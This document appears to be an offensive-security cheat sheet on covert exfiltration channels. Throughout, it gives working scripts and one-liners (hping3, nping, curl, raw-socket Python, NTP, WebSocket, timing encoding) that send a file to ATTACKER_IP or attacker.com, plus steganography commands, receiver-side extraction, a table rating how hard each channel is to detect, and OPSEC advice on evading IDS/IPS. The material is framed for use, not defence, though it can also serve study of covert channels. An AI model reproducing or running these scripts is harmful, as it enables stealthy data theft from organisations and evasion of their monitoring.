# Covert Channels for Exfiltration

## Overview
Covert channels hide exfiltration traffic within legitimate protocols or unused
protocol fields. They are slower but significantly harder to detect than standard
exfiltration methods. Useful when all obvious channels (HTTP, DNS, email) are
monitored or blocked.

## Types of Covert Channels
1. **Storage channels:** Hide data in protocol header fields (TTL, ID, TCP sequence numbers)
2. **Timing channels:** Encode data in packet timing patterns (inter-packet delay)
3. **Protocol tunneling:** Encapsulate data inside allowed protocols (ICMP, DNS, HTTP)
4. **Steganographic channels:** Hide data inside media files, documents, or images

## ICMP Covert Channel (T1048.001)
```bash
# Embed data in ICMP echo request payload
hping3 --icmp -d 1400 --file data.enc attacker_ip -c 1

# Continuous ICMP exfil with chunking
split -b 1400 data.enc /tmp/icmp_chunk_
for chunk in /tmp/icmp_chunk_*; do
    hping3 --icmp -d 1400 --file "$chunk" attacker_ip -c 1
    sleep $((RANDOM % 3 + 1))
done

# Python ICMP exfil (raw sockets, requires root)
python3 -c "
import socket, struct, time
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
with open('data.enc', 'rb') as f:
    seq = 0
    while True:
        chunk = f.read(1400)
        if not chunk:
            break
        # ICMP echo request: type=8, code=0
        checksum = 0
        header = struct.pack('!BBHHH', 8, 0, checksum, 0x1337, seq)
        packet = header + chunk
        # Calculate checksum
        s = sum(struct.unpack('!%dH' % (len(packet)//2), packet[:len(packet)&~1]))
        if len(packet) % 2:
            s += packet[-1] << 8
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        checksum = ~s & 0xffff
        header = struct.pack('!BBHHH', 8, 0, checksum, 0x1337, seq)
        sock.sendto(header + chunk, ('ATTACKER_IP', 0))
        seq += 1
        time.sleep(1)
"

# Receiver (attacker side)
tcpdump -i eth0 icmp -w icmp_capture.pcap
# Extract payloads from pcap
tshark -r icmp_capture.pcap -T fields -e data.data | xxd -p -r > received.enc
```

## TCP Header Covert Channels
```bash
# Encode data in TCP Initial Sequence Number (ISN)
# Each SYN packet carries 4 bytes in the ISN field
python3 -c "
import socket, struct
with open('data.enc', 'rb') as f:
    while True:
        chunk = f.read(4)
        if not chunk:
            break
        isn = struct.unpack('!I', chunk.ljust(4, b'\x00'))[0]
        # Use scapy or raw sockets to craft SYN with specific ISN
        # scapy: IP(dst='attacker')/TCP(dport=80, seq=isn, flags='S')
"

# Using nping for TCP covert channel
nping --tcp -p 80 --data-string "exfil_data_here" attacker_ip

# TCP Urgent pointer channel
hping3 -S -p 80 --urp 1337 attacker_ip  # encode data in urgent pointer
```

## HTTP Header Covert Channels
```bash
# Hide data in custom HTTP headers
curl -s -X GET https://attacker.com/index.html \
     -H "X-Request-ID: $(head -c 100 data.enc | base64 -w 0)" \
     -H "Cookie: session=$(head -c 200 data.enc | base64 -w 0)"

# Hide data in User-Agent rotations
AGENTS=("Mozilla/5.0" "Chrome/91.0" "Safari/537.36")
ENCODED=$(base64 -w 0 data.enc)
for i in $(seq 0 200 ${#ENCODED}); do
    CHUNK="${ENCODED:$i:200}"
    curl -s -A "${AGENTS[$((RANDOM % 3))]}; ${CHUNK}" \
         https://attacker.com/pixel.gif -o /dev/null
    sleep 5
done

# Embed in URL parameters (looks like analytics)
curl -s "https://attacker.com/collect?v=1&tid=UA-$(echo "$CHUNK" | head -c 50)&t=pageview" -o /dev/null
```

## Steganography Channels
```bash
# steghide — embed in JPEG (capacity depends on image size)
steghide embed -cf cover.jpg -ef secret.txt -p "$PASS" -f
steghide info cover.jpg  # check capacity
steghide extract -sf stego.jpg -p "$PASS"

# outguess — embed in JPEG with better detection resistance
outguess -k "$PASS" -d secret.txt cover.jpg stego.jpg
outguess -k "$PASS" -r stego.jpg recovered.txt

# OpenStego — embed in PNG with LSB
openstego embed -mf secret.txt -cf cover.png -sf stego.png -p "$PASS"
openstego extract -sf stego.png -p "$PASS"

# Audio steganography with sox + LSB
# Modify least significant bits of WAV samples

# Exfil the stego file via innocent-looking channel
curl -X POST -F "photo=@stego.jpg" https://attacker.com/gallery/upload
# Or email, social media, file share — looks like a normal image
```

## NTP Covert Channel
```bash
# Encode data in NTP extension fields
# NTP (port 123) is often allowed through firewalls
python3 -c "
import socket
data = open('data.enc','rb').read()
for i in range(0, len(data), 48):
    chunk = data[i:i+48].ljust(48, b'\x00')
    # Craft NTP-like packet with data in payload
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(b'\x1b' + chunk[1:], ('ATTACKER_IP', 123))
    sock.close()
"
```

## WebSocket Covert Channel
```bash
# Establish WebSocket and stream data as messages
python3 -c "
import websocket, base64
ws = websocket.create_connection('wss://attacker.com/ws')
with open('data.enc', 'rb') as f:
    while chunk := f.read(4096):
        ws.send(base64.b64encode(chunk).decode())
ws.close()
"
```

## Timing-Based Covert Channels
```bash
# Encode bits in inter-packet delays
# 1 = long delay (100ms), 0 = short delay (10ms)
python3 -c "
import time, socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('ATTACKER_IP', 8080))
with open('data.enc', 'rb') as f:
    for byte in f.read():
        for bit in range(8):
            if (byte >> (7 - bit)) & 1:
                time.sleep(0.1)  # bit = 1
            else:
                time.sleep(0.01)  # bit = 0
            sock.send(b'.')
sock.close()
"
# Extremely slow but nearly undetectable
```

## Detection Difficulty Matrix
| Channel              | Detection Difficulty | Speed     | Capacity  |
|----------------------|----------------------|-----------|-----------|
| ICMP payload         | Medium               | Medium    | 1400B/pkt |
| TCP ISN              | Hard                 | Very slow | 4B/pkt    |
| HTTP headers         | Medium               | Medium    | ~500B/req |
| Steganography        | Very hard            | Slow      | Varies    |
| NTP payload          | Hard                 | Slow      | 48B/pkt   |
| WebSocket            | Medium               | Fast      | Large     |
| Timing channel       | Very hard            | Very slow | 1bit/pkt  |

## OPSEC Considerations
- Covert channels trade speed for stealth — use only when needed
- Combine with legitimate traffic patterns
- Use encryption before embedding in covert channel
- Test channel reliability before committing to full exfil
- Have fallback channels ready if primary is detected
- Monitor target's IDS/IPS capabilities to choose appropriate channel
